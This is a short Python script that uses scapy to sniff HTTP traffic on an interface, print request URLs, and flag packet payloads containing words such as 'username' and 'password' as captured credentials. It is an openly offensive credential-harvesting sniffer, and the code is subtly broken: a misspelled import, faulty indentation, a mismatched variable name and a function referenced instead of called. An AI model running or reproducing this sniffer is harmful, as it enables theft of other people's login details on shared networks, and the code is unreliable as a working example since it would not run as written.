#!/usr/bin/env python
import subprocess
import scapy.all as scapy
from scap.layers import http

subprocess.call("pip install scapy_http")
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet,)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path
def get_login_info(packet):
if packet.haslayer(scapy.Raw):
    load = packet[scapy.Raw].load
    keyword = ["username", "user", "mail", "login", "pass", "password",]
    for keyword in keywords:
        if keyword in load:
            return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[1] HTTP Request >> " + url)

        login_info = get_login_info
        if login_info:
            print("\n\n[+] Possible username and password > " + login_info + "\n\n")

sniff("eth0")